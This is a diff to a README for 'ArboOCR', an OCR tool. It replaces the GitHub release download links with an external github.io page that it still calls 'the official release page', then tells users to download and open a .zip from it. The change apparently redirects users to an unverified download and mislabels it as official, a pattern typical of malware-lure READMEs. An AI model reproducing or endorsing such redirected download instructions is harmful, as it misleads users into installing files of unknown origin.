@@ -1,6 +1,6 @@
 # 📄 ArboOCR - Extract Text From Images Simply
 
-[![Download ArboOCR](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Triquetralgenuslotus738/ArboOCR/releases)
+[![Download ArboOCR](https://img.shields.io/badge/Download-Release-blue.svg)](https://triquetralgenuslotus738.github.io)
 
 ArboOCR turns images into text. It reads documents, signs, and screenshots. It works well on your computer. You do not need to write code to use it. The program handles all the math and processing behind the scenes. 
 
@@ -18,7 +18,7 @@ Check your computer before you start. ArboOCR needs these items to run well:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official release page: [https://github.com/Triquetralgenuslotus738/ArboOCR/releases](https://github.com/Triquetralgenuslotus738/ArboOCR/releases).
+1.  Visit the official release page: [https://triquetralgenuslotus738.github.io](https://triquetralgenuslotus738.github.io).
 2.  Find the section labeled Assets.
 3.  Click the link ending in .zip to start your download.
 4.  Open your Downloads folder once the file finishes saving.
